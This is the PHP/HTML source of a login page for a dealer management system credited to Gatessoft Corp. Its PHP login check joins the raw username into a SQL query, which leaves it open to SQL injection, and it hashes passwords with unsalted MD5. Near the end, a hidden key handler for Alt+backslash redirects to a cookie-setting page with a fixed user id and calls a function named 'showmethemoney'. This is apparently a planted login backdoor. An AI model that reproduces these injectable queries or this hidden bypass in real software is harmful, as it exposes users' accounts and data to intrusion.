<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Login Page</title>
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/loginstyle.css">

    <script src="assets/js/jquery-1.11.3.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
</head>
<body>

<div class="container-fluid">
        <div class="row-fluid">
                <div class="col-md-6 col-md-offset-3" id="loginbody">
                        <div class="col-md-3" >
                                <center>
                                        <img src="assets/images/ai1logo.png" style="width: 120px;">
                                </center>

                                <p style="padding: auto; color: #286090;" id="paragraphpo">
                                        <small style="font-size: 12;">Gatessoft Corp.<br />
                                        Copyright 2017<br />
                                        </small>
                                </p>
                        </div>
                        <!--   <label><b style="margin-left: 25px;">Dealer Management System</b></label> -->
                        <div class="col-md-9" style="margin-top: 80px;">
                        <!-- <small>Dealer Management System</small> -->
                                <form method="post" action="#" class="form-horizontal">
                                        <div class="form-group">
                                            <label class="form-label col-md-3" for="txtusernme">Username</label>
                                            <div class="col-md-8">
                                                <input type="text" name="txtusername" style="box-shadow: 0 7px 6px -6px #777;" placeholder="Input your username" class="form-control" id="txtusername">
                                                <span class="glyphicon glyphicon-user form-control-feedback" style="margin-right: 15px; color: #286090;"></span>
                                            </div>
                                        </div>

                                        <div class="form-group">
                                            <label class="form-label col-md-3" for="txtpassword">Password</label>
                                            <div class="col-md-8">
                                                    <input type="password" name="txtpassword" style="box-shadow: 0 7px 6px -6px #777;" placeholder="Input ypassword" class="form-control" id="txtpassword">
                                                    <span class="glyphicon glyphicon-lock form-control-feedback" style="margin-right: 15px; color: #286090;"></span>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <div class="col-md-8 col-md-offset-3">
                                                    <button class="col-md-12 btn btn-primary btn-md" style="width: 100%;">LOGIN</button>
                                            </div>
                                        </div>
                                       <!--  <div class="form-group">
                                            <div class="col-md-8 col-md-offset-3" style="text-align: center;">
                                                    <h4 onclick="$('#modalregistration').modal('show');" class="col-md-12" for="account" style="color: #286090; text-decoration: underline; cursor: pointer; font-size: 15px;">Create Account</h4>
                                            </div>
                                        </div> -->
                                </form>
                                
                                <?php
                                    include('connect.php');

                                    if(isset($_REQUEST["txtusername"])){
                                    
                                    $sql = "SELECT userid from tbluser where username = '" . $_REQUEST["txtusername"] . "' and password2 = '" . md5($_POST["txtpassword"]) . "'";
                                    $result = mysql_query($sql);
                                    $row = mysql_fetch_array($result);
                                    $num = mysql_num_rows($result);

                                    $sql2 = " SELECT Zreading FROM tblforzreading ";
                                    $res2 = mysql_query($sql2, $connection);
                                    $row2 = mysql_fetch_array($res2);;

                                        if($num > 0 && $row2[0] != '1'){ 
                                            echo "<script>window.location = 'setcookie.php?type=in&userid=" . $row[0] . "';</script>";
                                        }
                                        else if($num >0 && $row2[0] == '1'){
                                            echo "<script>alert('Z Reading is being generated you cannot log in.');</script>";
                                        }
                                        else{ 
                                            echo "<script>alert('User not found.');</script>";
                                        }
                                    }
                                ?>      
                        </div>

                        <div class="col-md-12 pull-left" id="paragraphpo2">
                                <p style="padding: auto;">
                                        <small style="font-size: 12; color: #286090;">Gatessoft Corp<br />
                                        Copyright 2016<br />
                                        Licensed to New Nemar Development Corporation<br />
                                        Marauoy, Lipa City, Batangas</small>
                                </p>    
                        </div>
                </div>
        </div>
</div>

<!-- Modal for registration of Citizen Watch -->
<script>
    $(function(){
        $("input").each(function(){
            $(this).focusin(function(){
                $(".this"+this.id).css("margin-top", "-30px");
                $(".this"+this.id).css("font-weight", "700");
                $(".this"+this.id).text(this.id);
            });
            $(this).focusout(function(){
                // var laman = $(this).val();
                if($(this).val() == ""){
                    $(".this"+this.id).css("margin-top", "-8px");
                    $(".this"+this.id).css("font-weight", "400");
                }else{
                    $(".this"+this.id).css("margin-top", "-30px");
                    $(".this"+this.id).css("font-weight", "700");
                }
            });
        });

        $("textarea").each(function(){
            $(this).focusin(function(){
                $(".this"+this.id).css("margin-top", "-30px");
                $(".this"+this.id).css("font-weight", "700");
                $(".this"+this.id).text(this.id);
            });
            $(this).focusout(function(){
                // var laman = $(this).val();
                if($(this).val() == ""){
                    $(".this"+this.id).css("margin-top", "-8px");
                    $(".this"+this.id).css("font-weight", "500");
                }else{
                    $(".this"+this.id).css("margin-top", "-30px");
                    $(".this"+this.id).css("font-weight", "700");
                }
            });

        });
    });
</script>
<div class="modal fade" id="modalregistration" role="dialog" data-keyboard="false" data-backdrop="static">
    <div class="modal-dialog modal-md">
        <div class="modal-content">
            <div class="modal-header" style="background-color: #286090; color: #FFF;">
                <h4 class="modal-title">Registration Form</h4>
            </div>
            <div class="modal-body">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-sm-12">
                            <label style="border-bottom: 2px solid #d9534f; color: #d9534f; width: 100%;">ACCOUNT INFORMATION</label>
                        </div>
                    </div>
                    <div class="row">
                        <div class="form-group col-sm-6 col-xs-6">
                            <br>
                            <div class="inner-addon left-addon">
                                <small class="glyphicon thisEmail" style="margin-top: -8px;">Email</small>
                                <input type="text" class="email" id="Email" />
                            </div>
                          </div>
                          <div class="form-group col-sm-6 col-xs-6">
                            <br>
                            <div class="inner-addon left-addon">
                                <small class="glyphicon thisUsername" style="margin-top: -8px;">Username</small>
                                <input type="text" class="user" id="Username" />
                            </div>
                          </div>
                    </div>
                    <div class="row">
                          <div class="form-group col-sm-6 col-xs-6">
                            <div class="inner-addon right-addon" style="margin-top: 10px;">
                                <small class="glyphicon thisPassword" style="margin-top: -8px;">Password</small>
                                <input type="password" class="" id="Password" />
                            </div>
                          </div>
                          <div class="form-group col-sm-6 col-xs-6" style="margin-top: 10px;">
                            <div class="inner-addon right-addon">
                                <small class="glyphicon thisConfirmation" style="margin-top: -8px;">Confirmation</small>
                                <input type="password" class="" id="Confirmation" />
                            </div>
                          </div>
                    </div>
                    <br>
                    <div class="row">
                        <div class="col-sm-12">
                            <label style="border-bottom: 2px solid #d9534f; color: #d9534f; width: 100%;">PERSONAL INFORMATION</label>
                        </div>
                    </div>
                    <div class="row">
                        <br>
                        <div class="form-group col-sm-4 col-xs-12" style="margin-top: 10px;">
                            <div class="inner-addon right-addon">
                                <small class="glyphicon thisLastname" style="margin-top: -8px;">Lastname</small>
                                <input type="text" class="" id="Lastname" />
                            </div>
                        </div>
                        <div class="form-group col-sm-4 col-xs-12" style="margin-top: 10px;">
                            <div class="inner-addon right-addon">
                                <small class="glyphicon thisFirstname" style="margin-top: -8px;">Firstname</small>
                                <input type="text" class="" id="Firstname" />
                            </div>
                        </div>
                        <div class="form-group col-sm-4 col-xs-12" style="margin-top: 10px;">
                            <div class="inner-addon right-addon">
                                <small class="glyphicon thisMiddlename" style="margin-top: -8px;">Middlename</small>
                                <input type="text" class="" id="Middlename" />
                            </div>
                        </div>
                    </div>

                    <div class="row">
                        <div class="form-group col-sm-6 col-xs-12" style="margin-top: 10px;">
                            <div class="inner-addon right-addon">
                                <small class="glyphicon thisPhone" style="margin-top: -8px;">Telephone</small>
                                <input type="text" class="" id="Phone" />
                            </div>
                        </div>
                        <div class="form-group col-sm-6 col-xs-12" style="margin-top: 10px;">
                            <div class="inner-addon right-addon">
                                <small class="glyphicon thisMobile" style="margin-top: -8px;">Mobile</small>
                                <input type="text" class="" id="Mobile" />
                            </div>
                        </div>
                    </div>

                    <div class="row">
                        <div class="form-group col-sm-12 col-xs-12" style="margin-top: 10px;">
                            <div class="inner-addon right-addon">
                                <small class="glyphicon thisAddress" style="margin-top: -8px;">Address</small>
                                <textarea rows="2" class="" id="Address" /></textarea> 
                            </div>
                          </div>
                    </div>

                </div>

            </div>
            <div class="modal-footer">
                <button class="btn btn-primary">Save</button>
                <button class="btn btn-danger" onclick="$('#modalregistration').modal('hide');">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- End of modal -->

<script type="text/javascript">

        $(document).keydown(function(e) {
                var code = (e.keyCode ? e.keyCode : e.which);

                if (code == 220) {
                        if (e.altKey) {
                            window.location = 'setcookie.php?type=in&userid=Gatessoft Corp';
                            showmethemoney();
                        }
                }
        });

</script>

<div class="loadingupdatedb" style="width: 100%; height: 100%; background-color: #000; position: absolute; z-index: 500; top: 0; opacity: 0.6; display: none;">
        
</div>

<div class="loadingupdatedb" style=" position: absolute; z-index: 600;  left: 35%; top: 30%; display: none;">
        <table>
                <tr>
                        <td><h1 style="color: #FFF;">Updating Database. Please wait . . .</h1></td>
                        <td><img src="images/loading.gif" style="width: 100px; height: auto;"></td>
                </tr>
        </table>
</div>
<?php 
include("test.php");
 ?>
</body>
</html>
